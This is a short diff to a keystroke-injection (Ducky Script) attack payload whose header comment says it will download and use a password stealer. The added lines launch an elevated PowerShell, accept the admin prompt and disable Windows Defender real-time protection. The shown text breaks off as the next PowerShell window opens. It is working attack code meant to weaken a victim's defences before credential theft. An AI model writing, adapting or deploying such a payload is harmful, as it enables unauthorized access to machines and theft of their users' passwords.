@@ -1,5 +1,20 @@
 REM DOWNLOAD AND USE PASSWORD STEALER
 DELAY 1000
+GUI r
+DELAY 900 
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 1000
+ENTER
+DELAY 900
+ALT y
+DELAY 900
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 800
+ENTER
+DELAY 700
+STRING exit
+DELAY 200 
+ENTER
 GUI r 
 DELAY 1000
 STRING powershell
